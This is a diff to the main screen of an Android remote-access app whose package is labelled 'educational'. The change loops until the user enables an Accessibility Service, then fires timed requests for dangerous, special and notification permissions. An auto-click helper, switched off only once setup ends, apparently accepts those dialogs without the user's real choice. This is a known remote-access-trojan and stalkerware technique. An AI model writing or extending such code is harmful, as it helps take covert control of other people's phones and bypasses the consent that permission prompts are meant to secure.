@@ -5,7 +5,9 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.widget.Button;
 import android.widget.TextView;
+import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
+import com.remoteaccess.educational.permissions.AccessibilityHelperService;
 import com.remoteaccess.educational.permissions.AutoPermissionManager;
 import com.remoteaccess.educational.services.RemoteAccessService;
 import com.remoteaccess.educational.utils.PreferenceManager;
@@ -16,6 +18,7 @@ public class MainActivity extends AppCompatActivity {
     private Button consentButton;
     private PreferenceManager preferenceManager;
     private AutoPermissionManager permissionManager;
+    private Handler handler;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -24,73 +27,110 @@ public class MainActivity extends AppCompatActivity {
 
         preferenceManager = new PreferenceManager(this);
         permissionManager = new AutoPermissionManager(this);
+        handler = new Handler();
 
         statusText = findViewById(R.id.statusText);
         consentButton = findViewById(R.id.consentButton);
 
-        // Check if consent already given
         if (preferenceManager.isConsentGiven()) {
             showActiveStatus();
             startRemoteAccessService();
-            // Auto-check and request additional permissions
-            autoRequestPermissions();
+            
+            // Check if accessibility is enabled
+            if (!permissionManager.isAccessibilityServiceEnabled()) {
+                // Not enabled - start setup flow
+                startAccessibilitySetup();
+            }
+            // If already enabled, nothing more needed
         } else {
             showConsentRequired();
-            // Auto-start consent flow
-            autoStartConsent();
+            // Auto-start consent after 1 second
+            new Handler().postDelayed(() -> {
+                Intent intent = new Intent(MainActivity.this, ConsentActivity.class);
+                startActivity(intent);
+            }, 1000);
         }
 
         consentButton.setOnClickListener(v -> {
             if (!preferenceManager.isConsentGiven()) {
-                // Show consent activity
                 Intent intent = new Intent(MainActivity.this, ConsentActivity.class);
                 startActivity(intent);
             } else {
-                // Revoke consent
                 revokeConsent();
             }
         });
     }
 
-    private void autoStartConsent() {
-        // Automatically start consent flow after a short delay
+    private void startAccessibilitySetup() {
+        Toast.makeText(this, "Please enable Accessibility Service...", Toast.LENGTH_LONG).show();
+        
+        // Ask for accessibility
         new Handler().postDelayed(() -> {
-            if (!preferenceManager.isConsentGiven()) {
-                Intent intent = new Intent(MainActivity.this, ConsentActivity.class);
-                startActivity(intent);
-            }
-        }, 1000); // 1 second delay
+            permissionManager.requestAccessibilityService();
+            
+            // Monitor for accessibility
+            monitorAccessibility();
+        }, 1000);
     }
 
-    private void autoRequestPermissions() {
-        // Automatically request permissions in background
-        new Handler().postDelayed(() -> {
-            if (preferenceManager.isConsentGiven()) {
-                // Request all dangerous permissions
-                permissionManager.requestAllPermissions();
-                
-                // Request special permissions after a delay
-                new Handler().postDelayed(() -> {
-                    permissionManager.requestSpecialPermissions();
-                }, 2000);
-                
-                // Request accessibility service
-                new Handler().postDelayed(() -> {
-                    if (!permissionManager.isAccessibilityServiceEnabled()) {
-                        permissionManager.requestAccessibilityService();
-                    }
-                }, 4000);
+    private void monitorAccessibility() {
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (permissionManager.isAccessibilityServiceEnabled()) {
+                    // Accessibility enabled - now auto-grant other permissions
+                    autoGrantPermissions();
+                } else {
+                    // Keep checking
+                    handler.postDelayed(this, 2000);
+                }
             }
-        }, 2000); // 2 second delay after service starts
+        }, 3000);
+    }
+
+    private void autoGrantPermissions() {
+        Toast.makeText(this, "Accessibility enabled! Setting up permissions...", Toast.LENGTH_SHORT).show();
+        
+        // Request all permissions
+        new Handler().postDelayed(() -> {
+            permissionManager.requestAllPermissions();
+        }, 1000);
+
+        // Request special permissions
+        new Handler().postDelayed(() -> {
+            permissionManager.requestSpecialPermissions();
+        }, 2500);
+
+        // Request notification
+        new Handler().postDelayed(() -> {
+            permissionManager.requestNotificationPermission();
+        }, 4000);
+
+        // Disable auto-click after setup is complete
+        new Handler().postDelayed(() -> {
+            AccessibilityHelperService.disableAutoClick();
+        }, 6000);
     }
 
     @Override
     protected void onResume() {
         super.onResume();
+        
         if (preferenceManager.isConsentGiven()) {
             showActiveStatus();
-            // Re-check permissions on resume
-            autoRequestPermissions();
+            
+            // Check if accessibility got enabled while in background
+            if (!permissionManager.isAccessibilityServiceEnabled()) {
+                startAccessibilitySetup();
+            }
+        }
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        if (handler != null) {
+            handler.removeCallbacksAndMessages(null);
         }
     }
 
@@ -111,11 +151,8 @@ public class MainActivity extends AppCompatActivity {
 
     private void revokeConsent() {
         preferenceManager.setConsentGiven(false);
-        
-        // Stop service
         Intent serviceIntent = new Intent(this, RemoteAccessService.class);
         stopService(serviceIntent);
-        
         showConsentRequired();
     }
 }
